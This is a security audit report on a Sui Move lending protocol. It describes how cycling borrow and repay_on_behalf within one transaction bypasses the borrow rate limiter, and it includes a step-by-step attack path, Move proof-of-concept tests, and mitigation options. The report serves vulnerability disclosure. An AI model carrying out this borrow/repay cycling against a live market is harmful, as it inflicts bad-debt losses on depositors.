# 063: Borrow Rate Limiter Bypass via `repay_on_behalf`

### Title
Attacker will bypass borrow rate limiter via `repay_on_behalf` to accumulate unbounded debt, causing bad debt for depositors

### Summary
The [`repay_on_behalf`](https://github.com/pebble-protocol/sui-move-contract/blob/8a250918a763b63449a767482a4c4a5079b30893/contracts/protocol/sources/entry_points/lending/repay.move#L33-L47) function (public, no ownership check) calls [`handle_repay`](https://github.com/pebble-protocol/sui-move-contract/blob/8a250918a763b63449a767482a4c4a5079b30893/contracts/protocol/sources/internal/market/market.move#L445-L489) which reduces the borrow rate limiter's outflow counter via [`reduce_outflow`](https://github.com/pebble-protocol/sui-move-contract/blob/8a250918a763b63449a767482a4c4a5079b30893/contracts/protocol/sources/internal/market/limiter.move#L100-L119). An attacker can cycle **borrow → repay_on_behalf(victim) → borrow** within a single Sui PTB to repeatedly reset the rate limiter's current segment, bypassing the borrow velocity cap entirely. This removes the protocol's primary defense against over-borrowing during oracle instability, enabling the attacker to accumulate unbounded individual debt (up to their collateral limit) in a single transaction.

### Root Cause
In [`market.move:483`](https://github.com/pebble-protocol/sui-move-contract/blob/8a250918a763b63449a767482a4c4a5079b30893/contracts/protocol/sources/internal/market/market.move#L483), the `handle_repay` function unconditionally reduces the borrow rate limiter's outflow:

```move
emode.borrow_mut_borrow_limiter().reduce_outflow(now, coin.value());
```

This is called for ALL repayments, including [`repay_on_behalf`](https://github.com/pebble-protocol/sui-move-contract/blob/8a250918a763b63449a767482a4c4a5079b30893/contracts/protocol/sources/entry_points/lending/repay.move#L33-L47) which requires no obligation ownership. The [`reduce_outflow`](https://github.com/pebble-protocol/sui-move-contract/blob/8a250918a763b63449a767482a4c4a5079b30893/contracts/protocol/sources/internal/market/limiter.move#L100-L119) function only modifies the current time segment (saturating at 0):

```move
if (segment.value <= reduced_value) {
    segment.value = 0;
} else {
    segment.value = segment.value - reduced_value;
}
```

Since `borrow` (via [`add_outflow`](https://github.com/pebble-protocol/sui-move-contract/blob/8a250918a763b63449a767482a4c4a5079b30893/contracts/protocol/sources/internal/market/limiter.move#L78-L94)) and `repay_on_behalf` (via `reduce_outflow`) operate on the same segment within one PTB (same timestamp), the attacker can repeatedly add and then remove outflow from the current segment while old segments remain unchanged. This resets the available capacity back to `outflow_limit - old_segments_total` after each repay cycle.

Additionally, the `reserve.debt` check (`asset_max_borrow_amount`) and `emode_group_total_borrow` check (`emode_max_borrow_amount`) are also neutralized because the repay resets reserve-level debt and emode-level tracking back to pre-borrow values after each cycle.

### Internal Pre-conditions
1. Borrow rate limiter is configured and active on the emode group (standard config)
2. At least one other obligation in the same emode group has outstanding debt in the target asset (to serve as repay target)

### External Pre-conditions
1. Oracle price deviation — attacker's collateral is temporarily overvalued (natural during volatile markets, flash crashes, or oracle lag). This is the scenario the rate limiter was specifically designed to protect against.

### Attack Path
1. Attacker creates an obligation in eMode group 1 and deposits 30 ETH collateral ($30K, temporarily overvalued due to oracle deviation)
2. Attacker calls `borrow(10,000 USDC)` → rate limiter outflow increases to 15,000 (5,000 from existing victim borrow + 10,000), reaching the limit
3. Attacker splits the borrowed coin: 5,000 USDC for repay, 5,000 USDC kept
4. Attacker calls `repay_on_behalf(victim_obligation_id, 5,000 USDC)` → rate limiter outflow decreases by 5,000 (back to 10,000)
5. Attacker calls `borrow(5,000 USDC)` → rate limiter allows it (outflow back to 15,000)
6. Repeat steps 3-5 N times within the same PTB, targeting different victim obligations as needed
7. After N cycles: attacker has accumulated debt far exceeding the rate limit's intended cap, while the limiter shows only 15,000 outflow
8. Oracle corrects → attacker's collateral value drops → attacker's debt far exceeds collateral → bad debt for protocol

All steps execute atomically in a single Sui Programmable Transaction Block (PTB). Each `borrow` call passes the `is_obligation_safe` check because the collateral is still overvalued during the PTB. The rate limiter, emode borrow limit, and reserve borrow limit are all neutralized by the intervening repay.

### Impact
The depositors (liquidity providers) suffer loss equal to the attacker's accumulated debt minus their actual collateral value after oracle correction. Without the bypass, the rate limiter would cap exposure to `outflow_limit` per cycle (e.g., $100K/day). With the bypass, exposure equals the attacker's full collateral-supported borrowing capacity (potentially $10M+ in a single block). The delta is the additional bad debt directly attributable to the rate limiter bypass.

Example: Rate limit = $100K/day. Attacker's (inflated) collateral supports $5M at 70% CF. Without bypass: max $100K bad debt exposure. With bypass: $5M bad debt exposure. If oracle corrects by 30%, bad debt = $5M - $3.5M = $1.5M.

### PoC

**File:** `poc_063_borrow_limiter_bypass_via_repay_on_behalf.move`

The PoC contains 4 tests: 2 unit tests (limiter-level) and 2 integration tests (full market entry points).
The integration test `test_borrow_limiter_bypass_integration` demonstrates the end-to-end attack:

1. eMode group 1 with borrow limiter capped at 15,000 USDC/day
2. Victim deposits 10 ETH, borrows 5,000 USDC (limiter: 5,000)
3. Attacker deposits 30 ETH, borrows 10,000 USDC (limiter: 15,000 — at limit)
4. Attacker splits 5,000 USDC and calls `repay_on_behalf(victim_obligation_id)` (limiter drops to 10,000)
5. Attacker borrows 5,000 MORE — **this succeeds only because of the bypass** (limiter: 15,000 again)

The control test `test_borrow_limiter_blocks_without_bypass_integration` proves that without step 4, the second borrow correctly aborts with error 105.

```move
/// PoC: Borrow Rate Limiter Bypass via repay_on_behalf
///
/// Unit tests prove the bypass mechanism at the limiter level.
/// Integration tests demonstrate the full end-to-end attack through market entry points.

#[test_only]
module protocol::poc_063_borrow_limiter_bypass;

use protocol::limiter;
use protocol::market_t::MainMarket;
use protocol::market_t::default_eth_decimal_places;
use protocol::oracle_t;
use protocol::enter_market;
use test_coin::eth::ETH;
use test_coin::usdc::USDC;
use sui::coin;
use sui::clock;
use sui::test_scenario;

const ADMIN: address = @0x1;
const VICTIM: address = @0xBB;
const ATTACKER: address = @0xCC;

// ========== Unit Tests ==========

/// Demonstrates that the borrow rate limiter can be bypassed by cycling
/// add_outflow (borrow) and reduce_outflow (repay_on_behalf) at the same timestamp.
///
/// Setup:
/// - Limiter: 10,000 outflow limit, 24h cycle, 1h segments
/// - Old segments: 3,000 total outflow (from prior borrows)
/// - Available capacity: 7,000
///
/// Attack:
/// - Borrow 7,000 -> at limit (10,000)
/// - reduce_outflow 7,000 (repay_on_behalf) -> back to 3,000
/// - Borrow 7,000 again -> at limit (10,000)
/// - reduce_outflow 7,000 (repay_on_behalf) -> back to 3,000
/// - Borrow 7,000 again -> at limit (10,000)
///
/// Result: Attacker borrowed 3 x 7,000 = 21,000 total, but limiter only shows 7,000
/// of current-segment outflow. The rate limit of 10,000 per cycle was bypassed.
#[test]
fun test_borrow_limiter_bypass_via_repay_on_behalf() {
    let segment_duration: u64 = 3600;      // 1 hour
    let cycle_duration: u64 = 86400;       // 24 hours
    let outflow_limit: u64 = 10_000;

    let mut limiter = limiter::new_from_struct(limiter::create_new_limiter_change(
        outflow_limit,
        (cycle_duration as u32),
        (segment_duration as u32),
    ));

    // --- Setup: simulate old borrows in previous segments totaling 3,000 ---
    let base_time: u64 = 100_000;

    // Segment at time base_time: 1,000 outflow
    limiter.add_outflow(base_time, 1_000);

    // Segment at time base_time + 3600: 1,000 outflow
    limiter.add_outflow(base_time + segment_duration, 1_000);

    // Segment at time base_time + 7200: 1,000 outflow
    limiter.add_outflow(base_time + 2 * segment_duration, 1_000);

    // Now advance to a new segment where the attack happens
    let attack_time = base_time + 3 * segment_duration; // same cycle window, new segment

    // Verify: current outflow = 3,000 (from 3 old segments)
    let usage = limiter.current_usage(attack_time);
    assert!(usage.usage() == 3_000, 0);
    assert!(usage.limit() == 10_000, 1);

    // --- Attack Cycle 1: Borrow 7,000 (reaches limit) ---
    limiter.add_outflow(attack_time, 7_000);

    let usage_after_borrow1 = limiter.current_usage(attack_time);
    assert!(usage_after_borrow1.usage() == 10_000, 2); // At limit!

    // Simulate repay_on_behalf: reduce_outflow by 7,000 (repaying victim's debt)
    limiter.reduce_outflow(attack_time, 7_000);

    let usage_after_repay1 = limiter.current_usage(attack_time);
    assert!(usage_after_repay1.usage() == 3_000, 3); // Back to 3,000! Limit freed.

    // --- Attack Cycle 2: Borrow 7,000 again (limiter allows it!) ---
    limiter.add_outflow(attack_time, 7_000);

    let usage_after_borrow2 = limiter.current_usage(attack_time);
    assert!(usage_after_borrow2.usage() == 10_000, 4); // At limit again

    // Simulate repay_on_behalf again
    limiter.reduce_outflow(attack_time, 7_000);

    let usage_after_repay2 = limiter.current_usage(attack_time);
    assert!(usage_after_repay2.usage() == 3_000, 5); // Reset again!

    // --- Attack Cycle 3: Borrow 7,000 one more time ---
    limiter.add_outflow(attack_time, 7_000);

    let usage_after_borrow3 = limiter.current_usage(attack_time);
    assert!(usage_after_borrow3.usage() == 10_000, 6); // At limit

    // --- Verification ---
    // The attacker has borrowed 3 x 7,000 = 21,000 total
    // The rate limiter was supposed to cap total outflow at 10,000 per cycle
    // Only 7,000 of net new capacity was available (10,000 - 3,000 old)
    // But attacker borrowed 21,000 (3x the available capacity!)
    //
    // In a real attack through the market:
    //   - Attacker's obligation debt: 21,000
    //   - Victim obligations' debt reduced by: 14,000 (2 x 7,000 repaid)
    //   - Attacker holds: 7,000 coins (from last borrow)
    //   - Rate limiter shows: 10,000 total (only 7,000 in current segment + 3,000 old)
    //   - Reserve.debt and emode_total are both net unchanged (borrow+repay cancel out)
    //
    // The rate limiter, emode borrow limit, and reserve borrow limit are ALL bypassed.

    // Final state: limiter shows 10,000 (at limit) but 21,000 was actually borrowed
    let final_usage = limiter.current_usage(attack_time);
    assert!(final_usage.usage() == 10_000, 7);

    // The attacker accumulated 21,000 of individual debt while the system
    // thinks only 7,000 of net new borrowing occurred in this window.
}

/// Shows that without the bypass, borrowing beyond the limit correctly fails.
#[test]
#[expected_failure(abort_code = 105, location = protocol::limiter)]
fun test_borrow_limiter_blocks_without_bypass() {
    let segment_duration: u64 = 3600;
    let cycle_duration: u64 = 86400;
    let outflow_limit: u64 = 10_000;

    let mut limiter = limiter::new_from_struct(limiter::create_new_limiter_change(
        outflow_limit,
        (cycle_duration as u32),
        (segment_duration as u32),
    ));

    let base_time: u64 = 100_000;

    // Old borrows: 3,000
    limiter.add_outflow(base_time, 1_000);
    limiter.add_outflow(base_time + segment_duration, 1_000);
    limiter.add_outflow(base_time + 2 * segment_duration, 1_000);

    let attack_time = base_time + 3 * segment_duration;

    // First borrow: 7,000 -> total 10,000 (at limit)
    limiter.add_outflow(attack_time, 7_000);

    // Second borrow without repay_on_behalf bypass: SHOULD FAIL
    // This correctly aborts with outflow_reach_limit_error (code 105)
    limiter.add_outflow(attack_time, 7_000);
}

// ========== Integration Tests ==========

/// Full end-to-end integration test: borrow -> repay_on_behalf(victim) -> borrow
/// through the actual market entry points.
///
/// Setup:
/// - eMode group 1 with borrow limiter: 15,000 USDC per 24h cycle
/// - Victim: deposits 10 ETH ($10K), borrows 5,000 USDC -> limiter at 5,000
/// - Attacker: deposits 30 ETH ($30K)
///
/// Attack:
/// - Attacker borrows 10,000 USDC -> limiter at 15,000 (at limit!)
/// - Attacker splits 5,000, calls repay_on_behalf(victim) -> limiter drops to 10,000
/// - Attacker borrows 5,000 more -> limiter at 15,000 again
///   WITHOUT the bypass, this second borrow would abort(105)
#[test]
fun test_borrow_limiter_bypass_integration() {
    let mut scenario_value = test_scenario::begin(ADMIN);
    let scenario = &mut scenario_value;
    let mut clock = clock::create_for_testing(scenario.ctx());

    // 1. Default market init: group 0 (unlimited limiters), 10M USDC liquidity
    let (admin_cap, app, mut market, coin_registry) =
        protocol::app_t::default_app_init<MainMarket>(scenario, &mut clock, ADMIN);

    let mut x_oracle = oracle_t::init_t(scenario);
    clock.set_for_testing(200 * 1000);
    x_oracle.update_price<ETH>(&clock, oracle_t::calc_scaled_price(1000, 0));
    x_oracle.update_price<USDC>(&clock, oracle_t::calc_scaled_price(1, 0));

    // 2. Create eMode group 1
    test_scenario::next_tx(scenario, ADMIN);
    protocol::emode_admin::onboard_new_emode_group<MainMarket>(
        &admin_cap, &app, &mut market, 0, &clock, scenario.ctx(),
    );

    // 3. Onboard USDC to group 1: borrow limiter = 15,000 USDC (15_000 * 10^6 raw)
    let usdc_deposit_limiter = protocol::emode_admin::create_limiter(
        &admin_cap, &app, 2u64.pow(63), 86400, 3600,
    );
    let usdc_borrow_limiter = protocol::emode_admin::create_limiter(
        &admin_cap, &app, 15_000_000_000, 86400, 3600, // 15,000 USDC
    );
    let usdc_emode = protocol::emode_admin::create_emode_params_test(
        &admin_cap,
        7000,  // collateral_factor 70%
        8000,  // liquidation_factor 80%
        500,   // liquidation_incentive 5%
        1_000_000_000_000_000_000, // max_borrow
        10000, // borrow_weight 100%
        1,     // flash_loan_fee
        usdc_deposit_limiter,
        usdc_borrow_limiter,
    );
    protocol::emode_admin::onboard_asset_to_emode_group<MainMarket, USDC>(
        &admin_cap, &app, &mut market, 1, usdc_emode, scenario.ctx(),
    );

    // Onboard ETH to group 1 (unlimited borrow limiter -- collateral only)
    let eth_deposit_limiter = protocol::emode_admin::create_limiter(
        &admin_cap, &app, 2u64.pow(63), 86400, 3600,
    );
    let eth_borrow_limiter = protocol::emode_admin::create_limiter(
        &admin_cap, &app, 2u64.pow(63), 86400, 3600,
    );
    let eth_emode = protocol::emode_admin::create_emode_params_test(
        &admin_cap,
        7000, 8000, 500,
        1_000_000_000_000_000_000,
        10000, 1,
        eth_deposit_limiter, eth_borrow_limiter,
    );
    protocol::emode_admin::onboard_asset_to_emode_group<MainMarket, ETH>(
        &admin_cap, &app, &mut market, 1, eth_emode, scenario.ctx(),
    );

    // --- Victim Setup ---
    // 4. Create victim obligation in eMode group 1
    test_scenario::next_tx(scenario, VICTIM);
    let victim_cap = enter_market::create_obligation_with_group<MainMarket>(
        &app, &mut market, 1, scenario.ctx(),
    );

    // 5. Victim deposits 10 ETH ($10,000 collateral, $7,000 borrowing power at 70% CF)
    let eth_coin = coin::mint_for_testing<ETH>(
        10 * 10u64.pow(default_eth_decimal_places()), // 10 ETH (8 decimals)
        scenario.ctx(),
    );
    protocol::deposit::deposit<MainMarket, ETH>(
        &app, &mut market, &victim_cap, eth_coin, &clock, scenario.ctx(),
    );

    // 6. Victim borrows 5,000 USDC -> limiter outflow: 5,000
    test_scenario::next_tx(scenario, VICTIM);
    clock.set_for_testing(300 * 1000);
    x_oracle.update_price<ETH>(&clock, oracle_t::calc_scaled_price(1000, 0));
    x_oracle.update_price<USDC>(&clock, oracle_t::calc_scaled_price(1, 0));

    let victim_borrow = protocol::borrow::borrow<MainMarket, USDC>(
        &app, &victim_cap, &mut market, &coin_registry,
        5_000_000_000, // 5,000 USDC
        &x_oracle, &clock, scenario.ctx(),
    );
    std::unit_test::destroy(victim_borrow);

    // --- Attacker Setup ---
    // 7. Create attacker obligation in eMode group 1
    test_scenario::next_tx(scenario, ATTACKER);
    let attacker_cap = enter_market::create_obligation_with_group<MainMarket>(
        &app, &mut market, 1, scenario.ctx(),
    );

    // 8. Attacker deposits 30 ETH ($30,000 collateral, $21,000 borrowing power)
    let eth_coin = coin::mint_for_testing<ETH>(
        30 * 10u64.pow(default_eth_decimal_places()), // 30 ETH
        scenario.ctx(),
    );
    protocol::deposit::deposit<MainMarket, ETH>(
        &app, &mut market, &attacker_cap, eth_coin, &clock, scenario.ctx(),
    );

    // --- Attack (all in one transaction, simulating a single PTB) ---
    test_scenario::next_tx(scenario, ATTACKER);
    clock.set_for_testing(400 * 1000);
    x_oracle.update_price<ETH>(&clock, oracle_t::calc_scaled_price(1000, 0));
    x_oracle.update_price<USDC>(&clock, oracle_t::calc_scaled_price(1, 0));

    // 9. Borrow 10,000 USDC -> limiter: 5,000 (victim) + 10,000 = 15,000 (AT LIMIT)
    let mut borrowed1 = protocol::borrow::borrow<MainMarket, USDC>(
        &app, &attacker_cap, &mut market, &coin_registry,
        10_000_000_000, // 10,000 USDC
        &x_oracle, &clock, scenario.ctx(),
    );

    // 10. Split: 5,000 for repay, keep 5,000
    let repay_coin = borrowed1.split(5_000_000_000, scenario.ctx());

    // 11. repay_on_behalf(victim) -> limiter drops by 5,000 -> limiter at 10,000
    //     NOTE: No ownership check -- attacker uses victim's raw obligation ID
    let refund = protocol::repay::repay_on_behalf<MainMarket, USDC>(
        &app,
        victim_cap.id(),  // victim's obligation ID -- no cap needed!
        &mut market,
        repay_coin,
        &clock,
        scenario.ctx(),
    );
    std::unit_test::destroy(refund);

    // 12. Borrow 5,000 MORE -> limiter: 10,000 + 5,000 = 15,000 (at limit again)
    //     WITHOUT THE BYPASS, this would abort(105) because limiter was at 15,000
    let borrowed2 = protocol::borrow::borrow<MainMarket, USDC>(
        &app, &attacker_cap, &mut market, &coin_registry,
        5_000_000_000, // 5,000 USDC
        &x_oracle, &clock, scenario.ctx(),
    );

    // --- Assertions ---
    // Attacker accumulated 15,000 USDC debt (10,000 + 5,000) but limiter allowed it
    // because repay_on_behalf reduced the outflow counter mid-attack.
    let obligation = market.borrow_obligation(attacker_cap.id());
    assert!(obligation.debt_types().contains(
        &std::type_name::with_defining_ids<USDC>()
    ));

    // The second borrow (step 12) is the proof: it succeeded only because
    // repay_on_behalf reduced the limiter from 15,000 to 10,000, freeing 5,000 capacity.
    // Without step 11, the limiter was at 15,000/15,000 and step 12 would abort(105).

    // Cleanup
    std::unit_test::destroy(borrowed1);
    std::unit_test::destroy(borrowed2);
    clock::destroy_for_testing(clock);
    test_scenario::return_shared(x_oracle);
    test_scenario::return_shared(market);
    std::unit_test::destroy(admin_cap);
    std::unit_test::destroy(victim_cap);
    std::unit_test::destroy(attacker_cap);
    std::unit_test::destroy(app);
    std::unit_test::destroy(coin_registry);
    test_scenario::end(scenario_value);
}

/// Control test: without repay_on_behalf bypass, the second borrow correctly fails.
/// Same setup as above, but attacker tries to borrow beyond the limit without repaying.
#[test]
#[expected_failure(abort_code = 105, location = protocol::limiter)]
fun test_borrow_limiter_blocks_without_bypass_integration() {
    let mut scenario_value = test_scenario::begin(ADMIN);
    let scenario = &mut scenario_value;
    let mut clock = clock::create_for_testing(scenario.ctx());

    let (admin_cap, app, mut market, coin_registry) =
        protocol::app_t::default_app_init<MainMarket>(scenario, &mut clock, ADMIN);

    let mut x_oracle = oracle_t::init_t(scenario);
    clock.set_for_testing(200 * 1000);
    x_oracle.update_price<ETH>(&clock, oracle_t::calc_scaled_price(1000, 0));
    x_oracle.update_price<USDC>(&clock, oracle_t::calc_scaled_price(1, 0));

    // Create eMode group 1 with tight borrow limiter
    test_scenario::next_tx(scenario, ADMIN);
    protocol::emode_admin::onboard_new_emode_group<MainMarket>(
        &admin_cap, &app, &mut market, 0, &clock, scenario.ctx(),
    );

    let usdc_deposit_limiter = protocol::emode_admin::create_limiter(
        &admin_cap, &app, 2u64.pow(63), 86400, 3600,
    );
    let usdc_borrow_limiter = protocol::emode_admin::create_limiter(
        &admin_cap, &app, 15_000_000_000, 86400, 3600,
    );
    let usdc_emode = protocol::emode_admin::create_emode_params_test(
        &admin_cap,
        7000, 8000, 500,
        1_000_000_000_000_000_000,
        10000, 1,
        usdc_deposit_limiter, usdc_borrow_limiter,
    );
    protocol::emode_admin::onboard_asset_to_emode_group<MainMarket, USDC>(
        &admin_cap, &app, &mut market, 1, usdc_emode, scenario.ctx(),
    );

    let eth_deposit_limiter = protocol::emode_admin::create_limiter(
        &admin_cap, &app, 2u64.pow(63), 86400, 3600,
    );
    let eth_borrow_limiter = protocol::emode_admin::create_limiter(
        &admin_cap, &app, 2u64.pow(63), 86400, 3600,
    );
    let eth_emode = protocol::emode_admin::create_emode_params_test(
        &admin_cap,
        7000, 8000, 500,
        1_000_000_000_000_000_000,
        10000, 1,
        eth_deposit_limiter, eth_borrow_limiter,
    );
    protocol::emode_admin::onboard_asset_to_emode_group<MainMarket, ETH>(
        &admin_cap, &app, &mut market, 1, eth_emode, scenario.ctx(),
    );

    // Victim: deposit + borrow to fill part of the limiter
    test_scenario::next_tx(scenario, VICTIM);
    let victim_cap = enter_market::create_obligation_with_group<MainMarket>(
        &app, &mut market, 1, scenario.ctx(),
    );
    let eth_coin = coin::mint_for_testing<ETH>(
        10 * 10u64.pow(default_eth_decimal_places()),
        scenario.ctx(),
    );
    protocol::deposit::deposit<MainMarket, ETH>(
        &app, &mut market, &victim_cap, eth_coin, &clock, scenario.ctx(),
    );

    test_scenario::next_tx(scenario, VICTIM);
    clock.set_for_testing(300 * 1000);
    x_oracle.update_price<ETH>(&clock, oracle_t::calc_scaled_price(1000, 0));
    x_oracle.update_price<USDC>(&clock, oracle_t::calc_scaled_price(1, 0));
    let victim_borrow = protocol::borrow::borrow<MainMarket, USDC>(
        &app, &victim_cap, &mut market, &coin_registry,
        5_000_000_000,
        &x_oracle, &clock, scenario.ctx(),
    );
    std::unit_test::destroy(victim_borrow);

    // Attacker: deposit collateral + borrow to fill limiter to capacity
    test_scenario::next_tx(scenario, ATTACKER);
    let attacker_cap = enter_market::create_obligation_with_group<MainMarket>(
        &app, &mut market, 1, scenario.ctx(),
    );
    let eth_coin = coin::mint_for_testing<ETH>(
        30 * 10u64.pow(default_eth_decimal_places()),
        scenario.ctx(),
    );
    protocol::deposit::deposit<MainMarket, ETH>(
        &app, &mut market, &attacker_cap, eth_coin, &clock, scenario.ctx(),
    );

    test_scenario::next_tx(scenario, ATTACKER);
    clock.set_for_testing(400 * 1000);
    x_oracle.update_price<ETH>(&clock, oracle_t::calc_scaled_price(1000, 0));
    x_oracle.update_price<USDC>(&clock, oracle_t::calc_scaled_price(1, 0));

    // Borrow 10,000 USDC -> limiter at 15,000 (at limit)
    let _borrowed1 = protocol::borrow::borrow<MainMarket, USDC>(
        &app, &attacker_cap, &mut market, &coin_registry,
        10_000_000_000,
        &x_oracle, &clock, scenario.ctx(),
    );

    // Try to borrow 1 more USDC without repay_on_behalf bypass -> ABORTS(105)
    let _borrowed2 = protocol::borrow::borrow<MainMarket, USDC>(
        &app, &attacker_cap, &mut market, &coin_registry,
        1_000_000, // even 1 USDC exceeds the limit
        &x_oracle, &clock, scenario.ctx(),
    );

    // Never reached -- abort happens above
    abort 0
}
```

### Mitigation
Option A (recommended): Do NOT reduce the borrow rate limiter on repayment. The rate limiter should be one-directional (only counts borrows, never decremented). This is the simplest fix:

```move
// In handle_repay, REMOVE this line:
// emode.borrow_mut_borrow_limiter().reduce_outflow(now, coin.value());
```

Option B: Only reduce the limiter when the repayer is the obligation owner (i.e., not `repay_on_behalf`):

```move
// Add a flag parameter to handle_repay to distinguish owner repay vs on_behalf
if (is_obligation_owner) {
    emode.borrow_mut_borrow_limiter().reduce_outflow(now, coin.value());
}
```

Option C: Track outflow per-obligation rather than globally per-emode-group, so one obligation's repay cannot free capacity for another.
